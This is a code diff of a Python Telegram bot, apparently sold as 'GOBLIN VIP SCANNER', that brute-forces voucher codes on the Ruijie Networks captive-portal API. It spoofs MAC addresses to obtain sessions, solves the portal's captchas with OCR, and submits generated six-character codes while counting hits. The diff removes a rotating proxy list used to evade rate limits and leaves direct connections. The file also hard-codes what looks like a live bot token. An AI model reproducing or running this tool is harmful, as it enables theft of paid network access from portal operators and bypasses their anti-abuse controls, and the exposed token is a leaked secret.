@@ -14,7 +14,6 @@ from datetime import datetime, timedelta
 import os
 import sys
 import gc
-import itertools
 import nest_asyncio
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -23,29 +22,11 @@ from telegram.ext import Application, ContextTypes, CommandHandler, CallbackQuer
 nest_asyncio.apply()
 
 # ── CONFIGURATION ──────────────────────────────────────────────────────────
-MAX_CONCURRENT = 200
-CONNECTION_LIMIT = 200
+MAX_CONCURRENT = 100
+CONNECTION_LIMIT = 100
 ADMIN_USERNAME = "gobiln07"
 ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
 TOKEN = "8895305429:AAFUhYikhgaLWOMcxRSMzeMdYbxbYBN9QCM"
-
-# 🌐 Proxy List ထည့်သွင်းသည့်နေရာ
-PROXY_LIST = [
-    "http://67.203.23.88:8081",
-    "http://66.151.34.89:80",
-    "http://153.72.68.0:8080",
-    "http://163.181.207.214:9999",
-    "http://147.161.246.246:11921",
-    "http://202.133.88.173:80",
-    "http://185.135.69.34:80",
-    "http://114.236.137.41:21000",
-    "http://49.146.50.98:8082",
-    "http://43.156.40.114:8080",
-    "http://114.111.151.41:80",
-    "http://45.174.242.142:999",
-    "http://116.12.47.94:8080",
-]
-proxy_pool = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
 
 # ── DATABASE SETUP ────────────────────────────────────────────────────────
 conn = sqlite3.connect('bot_database.db', check_same_thread=False)
@@ -94,22 +75,22 @@ def get_mac():
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
-async def get_session_id(session_obj, session_url, proxy=None, prev_sid=None):
+async def get_session_id(session_obj, session_url, prev_sid=None):
     mac = get_mac()
     url = replace_mac(session_url, new_mac=mac)
     headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'text/html'}
     try:
-        async with session_obj.get(url, headers=headers, proxy=proxy, allow_redirects=True, timeout=4) as req:
+        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             return sid.group(1) if sid else prev_sid
     except:
         return prev_sid
 
-async def Captcha_Image(session_obj, session_id, proxy=None):
+async def Captcha_Image(session_obj, session_id):
     params = {'sessionId': session_id, '_t': str(time.time())}
     headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
     try:
-        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy, timeout=4) as req:
+        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, timeout=5) as req:
             return await req.read()
     except:
         return None
@@ -117,11 +98,11 @@ async def Captcha_Image(session_obj, session_id, proxy=None):
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
-async def Varify_Captcha(session_obj, session_id, text, proxy=None):
+async def Varify_Captcha(session_obj, session_id, text):
     json_data = {'sessionId': session_id, 'authCode': text}
     headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'content-type': 'application/json'}
     try:
-        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy, timeout=4) as req:
+        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, timeout=5) as req:
             data = await req.json()
             return session_id if data.get("success") else None
     except:
@@ -185,31 +166,29 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
     session_id = None
     timeout = aiohttp.ClientTimeout(total=8, connect=2)
-    
-    proxy = next(proxy_pool) if proxy_pool else None
 
     for _ in range(2):
         if context_data.get('scan_stop', False): return None
         try:
             async with aiohttp.ClientSession(connector=connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
                 if not session_id:
-                    session_id = await get_session_id(task_session, session_url, proxy=proxy)
+                    session_id = await get_session_id(task_session, session_url)
                     if not session_id:
                         context_data['expired'] += 1; return None
 
-                image = await Captcha_Image(task_session, session_id, proxy=proxy)
+                image = await Captcha_Image(task_session, session_id)
                 if not image:
                     context_data['expired'] += 1; return None
                 text = await Captcha_Text(image)
-                if not text or not await Varify_Captcha(task_session, session_id, text, proxy=proxy):
+                if not text or not await Varify_Captcha(task_session, session_id, text):
                     context_data['expired'] += 1; return None
 
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                 headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
-                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=6) as req:
+                async with task_session.post(post_url, json=data, headers=headers, timeout=6) as req:
                     response = await req.text()
                     if 'request limited' in response:
-                        context_data['retry_total'] += 1; await asyncio.sleep(0.2); continue
+                        context_data['retry_total'] += 1; await asyncio.sleep(0.3); continue
                     if 'logonUrl' in response or '"success":true' in response:
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
@@ -256,9 +235,9 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
     code_gen = code_generator(mode)
 
     try:
-        status_msg = await query.message.reply_text(f"🚀 စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
+        status_msg = await query.message.reply_text(f"🚀 Direct Connection ဖြင့် စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
     except:
-        status_msg = await query.message.chat.send_message(f"🚀 စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
+        status_msg = await query.message.chat.send_message(f"🚀 Direct Connection ဖြင့် စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
 
     try:
         while not context.user_data.get('scan_stop', False):
@@ -298,7 +277,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             text = (
                 f"⚡ **GOBLIN VIP SCANNER** ⚡\n"
                 f"━━━━━━━━━━━━━━━━━━━\n"
-                f"🔍 Status: Running...\n"
+                f"🔍 Status: Running (Direct)...\n"
                 f"📦 Checked: {checked_total:,} codes\n"
                 f"🔑 Current: `{current_code}`\n"
                 f"🎯 Hits Found: {hits}\n"
@@ -435,9 +414,9 @@ async def gen_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.args:
         arg = context.args[0].strip()
     else:
-        msg_text = update.message.text.strip()
-        if msg_text.startswith("/gen") and len(msg_text) > 4:
-            arg = msg_text[4:].strip()
+      msg_text = update.message.text.strip()
+      if msg_text.startswith("/gen") and len(msg_text) > 4:
+          arg = msg_text[4:].strip()
 
     valid_durations = ["10မိနစ်", "30မိနစ်", "1နာရီ", "2နာရီ", "3နာရီ", "10နာရီ", "1ရက်", "2ရက်", "3ရက်", "7ရက်", "15ရက်", "30ရက်"]
 
@@ -488,7 +467,7 @@ async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("အက္ခရာ 6 လုံး (a-z)", callback_data="scan_alpha6"), InlineKeyboardButton("အရောအနှော 6 လုံး (a-z, 0-9)", callback_data="scan_mix6")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
     ])
-    await query.message.reply_text("🚀 **Brute Force Scanner**\n\nScan mode ကို ရွေးချယ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
+    await query.message.reply_text("🚀 **Brute Force Scanner (Direct)**\n\nScan mode ကို ရွေးချယ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
 
 async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query if update.callback_query else None
@@ -585,7 +564,7 @@ def main():
     from telegram.ext import MessageHandler, filters
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
-    print("🚀 Telegram Bot စတင်အလုပ်လုပ်နေပါပြီ...")
+    print("🚀 Telegram Bot (Direct Connection) စတင်အလုပ်လုပ်နေပါပြီ...")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
